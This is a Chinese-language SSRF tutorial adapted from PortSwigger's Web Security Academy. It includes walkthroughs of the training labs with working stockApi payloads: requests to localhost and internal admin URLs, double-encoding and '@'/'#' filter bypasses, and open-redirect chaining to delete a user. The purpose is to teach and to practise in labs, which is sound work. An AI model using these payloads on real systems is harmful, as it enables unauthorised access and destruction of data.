# 伺服器端請求偽造（SSRF）

By: 孫逸平

Ref: [https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

---

在這個章節，將解釋什麼是伺服器端請求偽造（SSRF），並說明一些常見的範例。也將展示如何發現並利用 SSRF 漏洞。

## 什麼是 SSRF？

伺服器端請求偽造是一種網路安全的漏洞，它允許攻擊者使伺服器端應用向非預期的位置發送請求。

在典型的 SSRF 攻擊中，攻擊者可能會導致伺服器連線至組織架構中僅允許內部連線的服務。在其他情況，可能強制伺服器連接到外部的任意外部系統。這可能會洩漏敏感資訊，例如授權憑證。

![](https://portswigger.net/web-security/images/server-side%20request%20forgery.svg)

圖片來源：[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## SSRF 攻擊造成的影響

成功的 SSRF 攻擊通常會導致未經授權的操作或存取組織內部的資料。這可能發生在易受攻擊的應用中，或其他能夠與它連線之後端系統。在某些情況下，SSRF 可能允許攻擊者執行任意指令。

SSRF 攻擊可能使其連線至外部的第三方系統並導致惡意的連續攻擊。這些似乎來自自託管易受攻擊的應用的組織。


## 常見的 SSRF 攻擊

SSRF 攻擊通常利用信任關係來從易受攻擊的應用程式升級攻擊並執行未經授權的操作。這些信任關係可能存在於伺服器之間，或者存在於同一組織內的其他後端系統之間。

### 針對伺服器的 SSRF 攻擊

在針對伺服器的 SSRF 攻擊中，攻擊者會導致應用程式通過其迴路網路介面向託管該應用程式的伺服器發出 HTTP 請求。這通常涉及提供一個帶有主機名稱（如 `127.0.0.1`）的 URL（這是一個指向迴路適配器的保留 IP 位址），或者使用 `localhost`（用於同一適配器的常用名稱）。

例如，想像一個購物應用程式，讓使用者查看某個物品在特定商店的庫存情況。為了提供庫存資訊，該應用程式必須查詢各種後端 REST API。它通過將 URL 傳遞到相關的後端 API 端點，透過前端 HTTP 請求來實現這一點。當使用者查看某物品的庫存狀態時，他們的瀏覽器會發出以下請求：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

這會導致伺服器向指定的 URL 發出請求，擷取庫存狀態，並將其回傳給使用者。

在這個例子中，攻擊者可以修改請求，指定一個伺服器本地的 URL：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
```

伺服器會擷取 `/admin` URL 的內容並將其回傳給使用者。

攻擊者可以訪問 `/admin` URL，但管理功能通常只有經過驗證的使用者才能存取。這意味著攻擊者不會看到任何有趣的內容。然而，如果對 `/admin` URL 的請求來自本地機器，則會繞過正常的存取控制。應用程式會授予完整的管理功能存取權限，因為這個請求看起來是來自一個受信任的位置。

* **Lab: [Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)**
    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
        ```
        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
        ```
    2. 將 body 更改成 admin 的路徑 `http://localhost/admin` 查看回應
        ```
        stockApi=http%3A%2F%2Flocalhost%2Fadmin
        ```
    3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://localhost/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
        ```
        stockApi=http%3A%2F%2Flocalhost%2Fadmin%2Fdelete%3Fusername%3Dcarlos
        ```

為什麼應用程式會這樣運作，並隱含地信任來自本地機器的請求？這可能出於各種原因：
  * 存取控制檢查可能在應用程式伺服器前面的另一個元件中實施。當連接回到伺服器時，這個檢查就被繞過了。
  * 出於災難復原的考量，應用程式可能允許來自本地機器的任何使用者無需登入即可進行管理存取。這為管理員提供了一種在遺失憑證時恢復系統的方法。這種設計假設只有完全受信任的使用者才會直接從伺服器發出請求。
  * 管理介面可能監聽與主應用程式不同的埠號，且可能無法被使用者直接存取。

這類信任關係，即來自本地機器的請求會得到不同於普通請求的處理，通常使 SSRF 成為一個嚴重的漏洞。

### 針對其他後端系統的 SSRF 攻擊

在某些情況下，應用程式伺服器能夠與使用者無法直接存取的後端系統互動。這些系統通常具有非路由的私有 IP 位址。後端系統通常受到網路拓撲的保護，因此它們的安全防護通常較弱。在許多情況下，內部後端系統包含敏感功能，任何能夠與這些系統互動的人都可以在無需驗證的情況下存取這些功能。

在前面的例子中，假設後端 URL `https://192.168.0.68/admin` 上有一個管理介面。攻擊者可以提交以下請求來利用 SSRF 漏洞，並存取管理介面：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin
```

* **Lab: [Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)**
    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
        ```
        stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
        ```
    2. 將 body 更改成 admin 的路徑 `http://192.168.0.1/admin` 爆破取得正常回應的 IP，並查看回應。經爆破得正常回應之 IP 為 `192.168.0.16`。
        ```
        stockApi=http%3A%2F%2F192.168.0.16%3A8080%2Fadmin
        ```
    3. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://192.168.0.16:8080/admin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
        ```
        stockApi=http%3A%2F%192.168.0.16%3A8080%2Fadmin%2Fdelete%3Fusername%3Dcarlos
        ```

## 繞過常見的 SSRF 防禦

在應用程式中經常可以看到包含 SSRF 行為以及旨在防止惡意利用的防禦措施。這些防禦措施通常可以被繞過。

### 基於黑名單的輸入過濾器的 SSRF

有些應用程式會阻擋包含主機名稱（如 `127.0.0.1` 和 `localhost`）或敏感 URL（如 `/admin`）的輸入。在這種情況下，您通常可以使用以下技術繞過過濾器：

* 使用 `127.0.0.1` 的替代 IP 表示法，例如 `2130706433`、`017700000001` 或 `127.1`。

* 註冊您自己的網域名稱，使其解析為 `127.0.0.1`。您可以使用 `spoofed.burpcollaborator.net` 來達成此目的。

* 使用 URL 編碼或大小寫變化來混淆被阻擋的字串。

* 提供一個您控制的 URL，將其重定向到目標 URL。嘗試使用不同的重定向代碼，以及目標 URL 的不同協定。例如，在重定向期間從 `http:` URL 切換到 `https:` URL 已被證明可以繞過某些反 SSRF 過濾器。

* **Lab: [SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)**
    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
        ```
        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
        ```
    2. 嘗試存取 `http://127.0.0.1/admin` 會被 WAF 擋住
    3. 嘗試存取 `http://127.1/admin` 繞過後仍被 WAF 擋住
    4. 將 `admin` 的 `a` 字元使用雙重 URL 編碼改成 `%2561dmin` 即可繞過 WAF
        ```
        stockApi=http%3A%2F%2F127.1%2F%2561dmin
        ```
    5. 回應為一個 html 資料，並在其中找到刪除使用者 `carlos` 的 API：`/admin/delete?username=carlos`，透過修改上述提到的 `stockApi`，使其向 `http://127.1/%2561dmin/delete?username=carlos` 發送請求即可刪除使用者並完成 Lab
        ```
        stockApi=http%3A%2F%2F127.1%2F%2561dmin%2Fdelete%3Fusername%3Dcarlos
        ```

### SSRF 使用白名單輸入過濾器

某些應用程式僅允許與允許值的白名單匹配的輸入。過濾器可能會在輸入的開頭或其中尋找匹配項。您可能能夠透過利用 URL 解析中的不一致性來繞過這個過濾器。

URL 規範包含許多在使用這種方法實現臨時解析和驗證 URL 時可能被忽視的特性：

* 可以在主機名之前使用 `@` 字符在 URL 中嵌入憑證。例如：
`https://expected-host:fakepassword@evil-host`

* 可以使用 `#` 字符來指示 URL 片段。例如：
`https://evil-host#expected-host`

* 可以利用 DNS 命名層次結構，將所需的輸入放入您控制的完全限定 DNS 名稱中。例如：
`https://expected-host.evil-host`

* 可以對字符進行 URL 編碼以混淆 URL 解析代碼。如果實現過濾器的代碼處理 URL 編碼字符的方式與執行後端 HTTP 請求的代碼不同，這特別有用。您還可以嘗試雙重編碼字符；某些伺服器會遞歸地對接收到的輸入進行 URL 解碼，這可能導致更多的差異。

* 可以結合使用這些技術。

* **Lab: [SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)**
    1. 取得庫存剩餘量，並查看查詢庫存的 API，發現該 API 為一個 POST 請求，body 資料如下：
        ```
        stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
        ```
    2. 嘗試存取 `http://127.0.0.1/admin` 被白名單擋住，只允許 `stock.weliketoshop.net` 的主機
    3. 嘗試存取 `http://localhost@stock.weliketoshop.net%2Fadmin` 回應狀態碼 `500`
    4. 嘗試存取 `http://localhost%2523stock.weliketoshop.net%2Fadmin` 仍被白名單擋住
    5. 嘗試存取 `http://localhost%2523@stock.weliketoshop.net%2Fadmin` 成功回應 html 資料
    6. 找到刪除使用者的 API `/admin/delete?username=carlos`
    7. 發送刪除使用者的請求 `http://localhost%2523@stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos` 完成 Lab

### 透過開放重定向繞過 SSRF 過濾器

有時可以透過利用開放重定向漏洞來繞過基於過濾器的防禦機制。

在前面的例子中，假設使用者提交的 URL 經過嚴格驗證，以防止惡意利用 SSRF 行為。然而，被允許的應用程式URL中包含開放重定向漏洞。如果用於發出後端 HTTP 請求的 API 支援重定向，你可以構造一個滿足過濾器要求的 URL，並導致重定向請求到所需的後端目標。

例如，應用程式包含一個開放重定向漏洞，其中以下 URL：

```
/product/nextProduct?currentProductId=6&path=http://evil-user.net
```

會返回重定向到：

```
http://evil-user.net
```

你可以利用開放重定向漏洞來繞過 URL 過濾器，並如下利用 SSRF 漏洞：

```
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

這個 SSRF 攻擊有效的原因是，應用程式首先驗證提供的 `stockAPI` URL 是否在允許的域名上，確實如此。然後應用程式請求提供的 URL，這觸發了開放重定向。它跟隨重定向，並向攻擊者選擇的內部 URL 發出請求。

* **Lab: [SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)**
    1. 進入任意商品頁面，點擊 Check stock 按鈕查看庫存，發現 data 部分會呼叫 API：
        ```
        stockApi=%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
        ```

        使用 URL decode 後是：
        ```
        stockApi=/product/stock/check?productId=1&storeId=1
        ```
    2. 由於這邊呼叫 API 沒有帶 Host，所以要找找看是否有能夠轉址的 API
    3. 在點擊 Next product 按鈕後，發現有一個 API 會進行轉址：
        ```
        /product/nextProduct?currentProductId=1&path=/product?productId=2
        ```
    4. 將以上資訊組合後，即可向題目要求的 URL 發送請求並刪除指定使用者完成此 Lab：
        ```
        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
        ```

        在回應中找到刪除使用者的 API，接著進行刪除
        ```
        stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
        ```

## 盲目 SSRF 漏洞

盲目 SSRF 漏洞發生在當你能夠讓應用程式向提供的 URL 發送後端 HTTP 請求時，但後端請求的回應並不會在應用程式的前端回應中返回。

盲目 SSRF 比較難以利用，但有時會導致伺服器或其他後端組件的完全遠端代碼執行。

### 了解更多

* [Finding and exploiting blind SSRF vulnerabilities](https://portswigger.net/web-security/ssrf/blind)

## 發現 SSRF 漏洞的隱藏攻擊面

許多伺服器端請求偽造漏洞很容易發現，因為應用程式的正常流量涉及包含完整 URL 的請求參數。其他的 SSRF 實例則較難定位。

### 請求中的部分 URL

有時，應用程式只將主機名稱或 URL 路徑的一部分放入請求參數中。提交的值接著會在伺服器端被整合到一個完整的 URL 中並被請求。如果該值很容易被識別為主機名稱或 URL 路徑，潛在的攻擊面可能是顯而易見的。然而，作為完整 SSRF 的可利用性可能受到限制，因為你無法控制被請求的整個 URL。

### 資料格式中的 URL

某些應用程式以包含規範的格式傳輸資料，該規範允許包含可能被格式的資料解析器請求的 URL。這方面一個明顯的例子是 XML 資料格式，它在網路應用程式中被廣泛用於從客戶端向伺服器傳輸結構化資料。當應用程式接受 XML 格式的資料並解析它時，可能容易受到 XXE 注入攻擊。它也可能透過 XXE 容易受到 SSRF 攻擊。當我們研究 XXE 注入漏洞時，我們將更詳細地涵蓋這一點。

### 透過 Referer 標頭的 SSRF

某些應用程式使用伺服器端分析軟體來追蹤訪客。這種軟體通常會記錄請求中的 Referer 標頭，以便追蹤傳入的連結。分析軟體經常會訪問出現在 Referer 標頭中的任何第三方 URL。這通常是為了分析引用網站的內容，包括傳入連結中使用的錨點文字。因此，Referer 標頭經常是 SSRF 漏洞的有用攻擊面。

請參閱盲目 SSRF 漏洞，了解涉及 Referer 標頭的漏洞範例。

#### 了解更多

* [Cracking the lens: Targeting auxiliary systems](https://portswigger.net/blog/cracking-the-lens-targeting-https-hidden-attack-surface#aux)
* [URL validation bypass cheat sheet](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet)
